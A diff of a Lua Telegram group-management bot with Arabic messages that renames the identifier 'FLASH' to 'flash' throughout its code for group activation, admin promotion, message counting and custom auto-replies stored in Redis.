-if text and not FLASHdx1:get(FLASH..'lock:bot:ttt'..bot_id) and not FLASHdx1:get(FLASH.."lock:bot:ttt2:"..msg.chat_id_) then  
+if text and not flashdx1:get(flash..'lock:bot:ttt'..bot_id) and not flashdx1:get(flash.."lock:bot:ttt2:"..msg.chat_id_) then  
 function dx(extra,result,success)
 if result.id_ then 
-local dx2 = FLASHdx1:get("dx:photo"..result.id_)
+local dx2 = flashdx1:get("dx:photo"..result.id_)
 if not result.profile_photo_ then 
 if dx2 then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
-FLASHdx1:del("dx:photo"..result.id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
+flashdx1:del("dx:photo"..result.id_) 
 end end
 if result.profile_photo_ then 
 if dx2 and dx2 ~= result.profile_photo_.big_.persistent_id_ then 
@@ -1740,66 +1740,66 @@ local dx_text = {
   "حطيت صورتي شوفوني اني صاك بنات 🙄😹",
 }
 dx3 = math.random(#dx_text)
-FLASHdx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
 end  
-FLASHdx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
+flashdx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
 end end end
 getUser(msg.sender_user_id_, dx)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local function openChat(chat_id,dl_cb)
 tdcli_function ({
 ID = "GetChat",
 chat_id_ = chat_id
 }, dl_cb, nil) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function resolve_username(username,cb)
 tdcli_function ({
 ID = "SearchPublicChat",
 username_ = username
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 res = 'https://api.telegram.org/bot'..tokenbot
 function Mute_time(chat_id,user_id,time)
 local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
 return https.request(mut)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function string:split(sep)
 local sep, fields = sep or ":", {}
 local pattern = string.format("([^%s]+)", sep)
 self:gsub(pattern, function(c) fields[#fields+1] = c end)
 return fields
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function faedr(msg,data) 
 local msg = data.message_
 local text = msg.content_.text_
 local caption = msg.content_.caption_
-if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not FLASHdx1:get(FLASH..'lock:bot:free'..bot_id) and FLASH11(msg) then
+if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not flashdx1:get(flash..'lock:bot:free'..bot_id) and flash11(msg) then
 function adding(extra,result,success)
 local function promote_admin(extra, result, success)
 local num = 0
 local admins = result.members_  
 for i=0 , #admins do   
 num = num + 1
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
 if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
 owner_id = admins[i].user_id_
-FLASHdx1:sadd(FLASH.."bot:monsh:"..msg.chat_id_,owner_id)
+flashdx1:sadd(flash.."bot:monsh:"..msg.chat_id_,owner_id)
 end end end
 getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
 if not is_admin(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH.."bot:enable:"..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ مفعله سابقا بالبوت .', 1, 'md')
+if flashdx1:get(flash.."bot:enable:"..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ مفعله سابقا بالبوت .', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_FLASH(msg)..'\n❅∫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
-openChat(msg.chat_id_,FLASH)
-FLASHdx1:sadd("FLASH:addg"..bot_id, msg.chat_id_)
-function FLASH(f1,f2) 
-function FLASH333(t1,t2) 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_flash(msg)..'\n❅∫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
+openChat(msg.chat_id_,flash)
+flashdx1:sadd("flash:addg"..bot_id, msg.chat_id_)
+function flash(f1,f2) 
+function flash333(t1,t2) 
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
@@ -1807,235 +1807,235 @@ local link = json:decode(req)
 if link.ok == true then 
 t2.invite_link_ = link.result
 end end 
-FLASHdx1:set(FLASH.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم تفعيل مجموعه جديده  \n❅∫ معرف الضافني ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي الضافني ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
+flashdx1:set(flash.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم تفعيل مجموعه جديده  \n❅∫ معرف الضافني ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي الضافني ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID 
-}, FLASH333, nil)
+}, flash333, nil)
 end
-openChat(msg.chat_id_,FLASH) 
-FLASHdx1:set(FLASH.."bot:enable:"..msg.chat_id_,true)
-FLASHdx1:setex(FLASH.."bot:charge:"..msg.chat_id_,86400,true)
-FLASHdx1:sadd("FLASH:addg"..bot_id, msg.chat_id_)
+openChat(msg.chat_id_,flash) 
+flashdx1:set(flash.."bot:enable:"..msg.chat_id_,true)
+flashdx1:setex(flash.."bot:charge:"..msg.chat_id_,86400,true)
+flashdx1:sadd("flash:addg"..bot_id, msg.chat_id_)
 end end end
 getUser(msg.sender_user_id_,adding) 
 end end  
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if (data.ID == "UpdateNewMessage") then
 local msg = data.message_
 --vardump(data)
 local d = data.disable_notification_
 local chat = chats[msg.chat_id_]
 faedr(data.message_,data)
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- OLD MSG
 if msg.date_ < (os.time() - 30) then
 print("**** OLD MSG ****")
 return false
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-FLASHdx1:set(bot_id..'FLASH:UserName'..msg.sender_user_id_,data.username_)
+flashdx1:set(bot_id..'flash:UserName'..msg.sender_user_id_,data.username_)
 end;end,nil)
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local idf = tostring(msg.chat_id_)
-if not FLASHdx1:get(FLASH.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
+if not flashdx1:get(flash.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
 print("Return False [ Not Enable ]")
 return false
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
 function get_mymsg_contact(extra, result, success)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
 return
 end
---     By Developer FLASH     -- 
-FLASHdx1:incr(FLASH.."bot:allmsgs")
+--     By Developer flash     -- 
+flashdx1:incr(flash.."bot:allmsgs")
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match('-100(%d+)') then
 if msg.can_be_deleted_ == true then 
-FLASHdx1:sadd(FLASH.."bot:groups",msg.chat_id_)
+flashdx1:sadd(flash.."bot:groups",msg.chat_id_)
 end
-if not FLASHdx1:sismember(FLASH.."bot:groups",msg.chat_id_) then
-FLASHdx1:sadd(FLASH.."bot:groups",msg.chat_id_)
+if not flashdx1:sismember(flash.."bot:groups",msg.chat_id_) then
+flashdx1:sadd(flash.."bot:groups",msg.chat_id_)
 end
 elseif id:match('^(%d+)') then
-if not FLASHdx1:sismember(FLASH.."bot:userss",msg.chat_id_) then
-FLASHdx1:sadd(FLASH.."bot:userss",msg.chat_id_)
+if not flashdx1:sismember(flash.."bot:userss",msg.chat_id_) then
+flashdx1:sadd(flash.."bot:userss",msg.chat_id_)
 end else
-if not FLASHdx1:sismember(FLASH.."bot:groups",msg.chat_id_) then
-FLASHdx1:sadd(FLASH.."bot:groups",msg.chat_id_)
+if not flashdx1:sismember(flash.."bot:groups",msg.chat_id_) then
+flashdx1:sadd(flash.."bot:groups",msg.chat_id_)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- MSG TYPES 
 if msg.content_ then
 if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
 print("This is [ Inline ]")
 msg_type = 'MSG:Inline'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageText" then
 text = msg.content_.text_
 print("This is [ Text ]")
 msg_type = 'MSG:Text'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
  if msg.content_.ID == "MessageChatAddMembers" then
-FLASHdx1:incr(FLASH..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:incr(flash..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
 end
 if msg.content_.ID == "MessagePhoto" then
-FLASHdx1:incr(FLASH.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
+flashdx1:incr(flash.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
 if msg.content_.ID == "MessageAnimation" then
-FLASHdx1:incr(FLASH.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
+flashdx1:incr(flash.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
 if msg.content_.ID == "MessageVideo" then
-FLASHdx1:incr(FLASH.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
+flashdx1:incr(flash.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
 if msg.content_.ID == "MessageVoice" then
-FLASHdx1:incr(FLASH.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
+flashdx1:incr(flash.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
 if msg.content_.ID == "MessageSticker" then
-FLASHdx1:incr(FLASH.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
+flashdx1:incr(flash.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatJoinByLink" and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH.."Lock:Join"..msg.chat_id_) then
+if flashdx1:get(flash.."Lock:Join"..msg.chat_id_) then
 chat_kick(msg.chat_id_,msg.sender_user_id_) 
 return false  
 end
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessagePhoto" then
 print("This is [ Photo ]")
 msg_type = 'MSG:Photo'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatAddMembers" then
 print("This is [ New User Add ]")
 msg_type = 'MSG:NewUserAdd'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageDocument" then
 print("This is [ File Or Document ]")
 msg_type = 'MSG:Document'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageSticker" then
 print("This is [ Sticker ]")
 msg_type = 'MSG:Sticker'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageAudio" then
 print("This is [ Audio ]")
 msg_type = 'MSG:Audio'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageVoice" then
 print("This is [ Voice ]")
 msg_type = 'MSG:Voice'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageVideo" then
 print("This is [ Video ]")
 msg_type = 'MSG:Video'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageAnimation" then
 print("This is [ Gif ]")
 msg_type = 'MSG:Gif'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageLocation" then
 print("This is [ Location ]")
 msg_type = 'MSG:Location'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By link ]")
-if FLASHdx1:get(FLASH.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
+if flashdx1:get(flash.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
 local Text = '❅∫ اهلا عزيزي .\n❅∫ يجب علينا التأكد أنك لست روبوت .\n❅∫ تم تقييدك اضغط الزر بالاسفل 🔽\n'
 keyboard = {} -- الحقوق محفوظه لسورس فلاش لتخمط بدون ذكر المصدر
 keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
 Msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
-FLASHdx1:sadd(FLASH.."FLASHdx1:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
+flashdx1:sadd(flash.."flashdx1:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
 https.request("https://api.telegram.org/bot"..tokenbot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 msg_type = 'MSG:NewUser'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By link ]")
 msg_type = 'MSG:NewUser'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
 print("This is [ MarkDown ]")
 msg_type = 'MSG:MarkDown'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By Link ]")
 msg_type = 'MSG:JoinByLink'
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageContact" then
 print("This is [ Contact ]")
 msg_type = 'MSG:Contact'
 end 
 ---------------
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if ((not d) and chat) then
 if msg.content_.ID == "MessageText" then
 do_notify (chat.title_, msg.content_.text_)
 else
 do_notify (chat.title_, msg.content_.ID)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.photo_ then
-if FLASHdx1:get(FLASH..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
+if flashdx1:get(flash..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
 if msg.content_.photo_.sizes_[3] then
 photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 else
 photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تغيير صوره المجموعه . \n', 1, 'md') 
-FLASHdx1:del(FLASH..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تغيير صوره المجموعه . \n', 1, 'md') 
+flashdx1:del(flash..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
 setphoto(msg.chat_id_, photo_id)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 text = msg.content_.text_ 
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
-local content_text = FLASHdx1:get(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+local content_text = flashdx1:get(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
 if content_text == 'save_repgp' then 
 if text == 'الغاء' then
-local delrep_owner = FLASHdx1:get(FLASH..'delrep_owner'..msg.chat_id_..'')
-FLASHdx1:srem(FLASH..'rep_owner'..msg.chat_id_..'',delrep_owner)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرد . \n', 1, 'md')
-FLASHdx1:del(FLASH..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
-FLASHdx1:del(FLASH..'delrep_owner'..msg.chat_id_..'')
+local delrep_owner = flashdx1:get(flash..'delrep_owner'..msg.chat_id_..'')
+flashdx1:srem(flash..'rep_owner'..msg.chat_id_..'',delrep_owner)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرد . \n', 1, 'md')
+flashdx1:del(flash..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
+flashdx1:del(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
+flashdx1:del(flash..'delrep_owner'..msg.chat_id_..'')
 return false
 end
-FLASHdx1:del(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
-local content_text = FLASHdx1:get(FLASH..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
-if msg.content_.video_ then FLASHdx1:set(FLASH..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
+flashdx1:del(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+local content_text = flashdx1:get(flash..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
+if msg.content_.video_ then flashdx1:set(flash..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
 end
-if msg.content_.document_ then FLASHdx1:set(FLASH..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
+if msg.content_.document_ then flashdx1:set(flash..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
 end
-if msg.content_.sticker_ then FLASHdx1:set(FLASH..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
+if msg.content_.sticker_ then flashdx1:set(flash..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
 end 
-if msg.content_.voice_ then FLASHdx1:set(FLASH..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
+if msg.content_.voice_ then flashdx1:set(flash..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
 end
-if msg.content_.audio_ then FLASHdx1:set(FLASH..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
+if msg.content_.audio_ then flashdx1:set(flash..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2050,85 +2050,85 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-FLASHdx1:set(FLASH..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
+flashdx1:set(flash..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
 end
-if msg.content_.animation_ then FLASHdx1:set(FLASH..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
+if msg.content_.animation_ then flashdx1:set(flash..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
 end 
 if msg.content_.text_ then
-FLASHdx1:set(FLASH..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
+flashdx1:set(flash..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
 end 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الرد . \n', 1, 'md') 
-FLASHdx1:del(FLASH..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'delrep_owner'..msg.chat_id_..'')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الرد . \n', 1, 'md') 
+flashdx1:del(flash..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
+flashdx1:del(flash..'delrep_owner'..msg.chat_id_..'')
 return false 
 end end
-if msg.content_.text_ and not FLASHdx1:get(FLASH..'lock_reeeep'..msg.chat_id_) then 
-if FLASHdx1:get(FLASH..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if msg.content_.text_ and not flashdx1:get(flash..'lock_reeeep'..msg.chat_id_) then 
+if flashdx1:get(flash..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end 
-if FLASHdx1:get(FLASH..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if flashdx1:get(flash..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end 
-if FLASHdx1:get(FLASH..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if flashdx1:get(flash..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end
-if FLASHdx1:get(FLASH..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if flashdx1:get(flash..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end
-if FLASHdx1:get(FLASH..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if flashdx1:get(flash..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end
-if FLASHdx1:get(FLASH..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
+if flashdx1:get(flash..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
 end 
-if FLASHdx1:get(FLASH..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
+if flashdx1:get(flash..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
 end 
-if FLASHdx1:get(FLASH..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
-function FLASH(extra,result,success)
+if flashdx1:get(flash..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
+function flash(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local FLASHdxs = (FLASHdx1:get('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local user_msgs = FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = FLASHdx1:get(FLASH..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+local flashdxs = (flashdx1:get('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local user_msgs = flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = flashdx1:get(flash..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
-local Text = Text:gsub('#msgs',(user_msgs + FLASHdxs or 'لا يوجد'))
-local Text = Text:gsub('#stast',(renk_FLASH(msg) or 'لا يوجد'))
-FLASHdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
+local Text = Text:gsub('#msgs',(user_msgs + flashdxs or 'لا يوجد'))
+local Text = Text:gsub('#stast',(renk_flash(msg) or 'لا يوجد'))
+flashdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
 end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 text = msg.content_.text_
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
-local content_text = FLASHdx1:get(FLASH.."add:repallt"..msg.sender_user_id_)
+local content_text = flashdx1:get(flash.."add:repallt"..msg.sender_user_id_)
 if content_text == 'save_rep' then
 if text == 'الغاء' then
-local delrep_sudo = FLASHdx1:get(FLASH..'delrep_sudo')
-FLASHdx1:del(FLASH.."rep_sudo",delrep_sudo)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرد . \n', 1, 'md')
-FLASHdx1:del(FLASH.."addreply2:"..msg.sender_user_id_)
-FLASHdx1:del(FLASH.."add:repallt"..msg.sender_user_id_)
-FLASHdx1:del(FLASH.."delrep_sudo")
+local delrep_sudo = flashdx1:get(flash..'delrep_sudo')
+flashdx1:del(flash.."rep_sudo",delrep_sudo)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرد . \n', 1, 'md')
+flashdx1:del(flash.."addreply2:"..msg.sender_user_id_)
+flashdx1:del(flash.."add:repallt"..msg.sender_user_id_)
+flashdx1:del(flash.."delrep_sudo")
 return false
 end
-FLASHdx1:del(FLASH.."add:repallt"..msg.sender_user_id_)
-local content_text = FLASHdx1:get(FLASH.."addreply2:"..msg.sender_user_id_)
+flashdx1:del(flash.."add:repallt"..msg.sender_user_id_)
+local content_text = flashdx1:get(flash.."addreply2:"..msg.sender_user_id_)
 if msg.content_.video_ then
-FLASHdx1:set(FLASH.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
+flashdx1:set(flash.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
 end
 if msg.content_.document_ then
-FLASHdx1:set(FLASH.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
+flashdx1:set(flash.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
 end
 if msg.content_.sticker_ then
-FLASHdx1:set(FLASH.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
